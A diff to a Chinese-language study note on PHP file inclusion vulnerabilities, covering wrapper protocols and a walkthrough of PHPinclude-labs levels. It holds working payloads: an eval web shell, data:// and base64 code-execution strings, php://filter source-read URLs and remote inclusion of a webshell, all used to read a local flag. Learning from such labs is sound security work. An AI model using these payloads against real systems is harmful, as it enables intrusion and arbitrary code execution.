@@ -25,6 +25,8 @@ echo "I have a $color $car"; // I have a red BMW
 
 找不到被包含的文件时只产生警告 ，脚本将继续执行。(require则会停止运行)
 
+包含文本文件时可以直接输出，如果静态储存则不能
+
 ![image](https://github.com/user-attachments/assets/b28695f4-a214-46ac-a2ce-35e1e37ec6b7)
 
 ### include_once()
@@ -77,29 +79,57 @@ file_put_contents
 fopen (比较常见)
 ```
 
-### php://filter
-php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
+php支持的协议和封装协议，可用于文件包含函数
+```
+file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — 安全外壳协议 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+```
 
-简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。
+### file://
+访问本地文件系统
+file:///flag
+
+### php://
+访问各个输入/输出流（I/O streams），PHP中最为复杂和强大的协议
+
+### php://filter
+php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。
 
 php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。
 
 resource=<要过滤的数据流> 这个参数是必须的。它指定了你要筛选过滤的数据流。
 read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
 write=<写链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
-<；两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
+<;两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
+
+格式：
+?变量名=filter/read=/resource=/flag
 
 常用：
 ```
+php://filter/x=A|B|C|/resouce=xxx
 php://filter/read=convert.base64-encode/resource=index.php
 php://filter/resource=index.php
 ```
+
 利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。而使用的convert.base64-encode，就是一种过滤器。
 
 ### php://input
 php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
 
-php.ini 中的 allow_url_include设置为On 才能成功执行
+```
+php://input + [POST DATA部分]
+```
 
 例如：
 http://127.0.0.1/cmd.php?cmd=php://input
@@ -115,6 +145,14 @@ POST数据：<?php phpinfo()?>
 
 ### data://
 数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。
+如果传入的数据是PHP代码，就会执行代码
+简单来说就是data://text/plain+,<?php 命令;?>
+
+text/html → 按 HTML 解析
+
+image/png → 按 PNG 图片处理
+
+text/plain → 视为纯文本，直接显示内容，不执行任何解析。
 
 ```
 示例用法：
@@ -124,6 +162,8 @@ http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 2、data://text/plain;base64,
 http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
 
+data://text/plain,<?php phpinfo();?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 
 Example #1 打印 data:// 的内容
 <?php
@@ -139,6 +179,13 @@ $meta  =  stream_get_meta_data ( $fp );
 // 打印 "text/plain"
 echo  $meta [ 'mediatype' ];
 ?>
+```
+
+### http://
+访问 HTTP(s) 网址
+例如
+```
+https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI
 ```
 
 ## 文件包含漏洞的防御
@@ -159,4 +206,92 @@ PHP:配置php.ini关闭远程文件包含功能(allow_url_include = Off)
 包含文件验证：验证被包含的文件是否是白名单中的一员；
 
 尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include("head.php");，不要把被包含的写成变量。
+
+# PHPinclude-labs
+## Level 0
+进入后发现源代码中含有include函数，同时界面有提示，backdoor.txt 内容为: <?php @eval($_POST['ctf']); ?>，含有危险的eval函数就可以操作一下
+
+![QQ_1743090821722](https://github.com/user-attachments/assets/70aaf189-2c55-43b3-9aa1-2a8d18ed7126)
+
+直接通过get方式访问backdoor.txt文件，并post一下system函数，通过ls查看目录
+
+![image](https://github.com/user-attachments/assets/bdf3cb7c-db87-4b43-9748-f969e6805ac5)
+
+直接使用cat查看flag目录下的文件，得到flag flag{TEST_Dynamic_FLAG}
+![image](https://github.com/user-attachments/assets/803b39af-ecda-4257-8d86-2b694cb14f9a)
+
+## Level 1
+进入后提示使用file协议
+
+![image](https://github.com/user-attachments/assets/4f2ada16-8d70-4d09-a4e3-b18c14cb43f6)
+
+首先尝试直接访问，发现失败了，检索得知flag.php 中 flag以静态变量形式存储。由于并没有输出操作，它只会被加载到服务器或者说容器的内存中，这种形式的FLAG您无法通过单纯包含得到。所以无法通过flag.php文件获得。
+
+![image](https://github.com/user-attachments/assets/383066b6-a138-416a-b87f-f36c3ca23a6a)
+
+尝试访问根目录下文本形式的flag文件，得到flag
+
+![image](https://github.com/user-attachments/assets/294cd057-d006-4b25-99e6-8c41d2372567)
+
+## Level 2
+这一关提示只能使用data协议
+
+![image](https://github.com/user-attachments/assets/bd29f741-6b14-4c44-a5ac-b8ab47deb5f9)
+
+先查看目录，直接访问，得到flag
+
+![image](https://github.com/user-attachments/assets/3aa9da09-a40f-471f-9a5e-85fa2a785d20)
+
+![image](https://github.com/user-attachments/assets/d17c6acc-c914-4545-ada1-ff3f724bc1d2)
+
+## Level 3
+这一关还是使用data协议，但是发现过滤掉了/flag|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\
+
+![image](https://github.com/user-attachments/assets/261fce22-6bad-45ea-81c3-d11745bb96a3)
+
+可以通过Base64的输入形式进行绕过,直接将<?php system("cat /flag");?>编码
+
+![image](https://github.com/user-attachments/assets/d4cea6c2-9216-4226-8cdb-cc75cd8b9bd2)
+
+?wrappers=;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg，得到flag
+
+![image](https://github.com/user-attachments/assets/4ded4c59-932f-495f-93d9-b744447e3d9b)
+
+## Level 4
+进入后提示本关卡只能使用http/https 协议
+
+![image](https://github.com/user-attachments/assets/0970147e-42b0-4cc9-a854-8a85b78de88c)
+
+在大多数情况下，localhost 只是默认情况下引用 127.0.0.1 的简写，即本地主机.可以直接通过http/https 协议访问127.0.0.1/backdoor.txt（localhost/backdoor.txt也可以）
+
+![image](https://github.com/user-attachments/assets/75553369-f2b7-4abd-8d00-1e34591ef513)
+
+直接cat /flag即可
+
+![image](https://github.com/user-attachments/assets/71b45716-5e18-45a7-a325-da7bcd2f8ace)
+
+## Level 5
+这一关还是使用http/https 协议，提示访问challenge.txt
+
+![image](https://github.com/user-attachments/assets/155ae9c5-5469-4fdf-a590-a4245dc2d84f)
+
+访问失败了，说明当前目录在不再有后门文件了,可以考虑使用远程文件包含
+
+![image](https://github.com/user-attachments/assets/2dfaed63-799c-4970-8423-797f19e3286f)
+
+尝试自己构建一个webshell但是不知道为什么没有运行,之后会用蚁剑再次尝试
+
+这里直接使用作者的一句话木马进行远端包含，得到flag
+
+![image](https://github.com/user-attachments/assets/f2dfc98e-26eb-46f6-8a65-22a70fc7a4a8)
+
+## Level 6
+这一关要求使用php://协议
+
+![image](https://github.com/user-attachments/assets/9970b187-fcb8-46d7-9328-1b0fbca35e94)
+
+这里选择用php://filter方式直接访问flag
+php://filter/read=/resource=/flag
+
+![image](https://github.com/user-attachments/assets/23bd4dd8-830f-4209-9d7f-5b7a0f1d28d5)
 
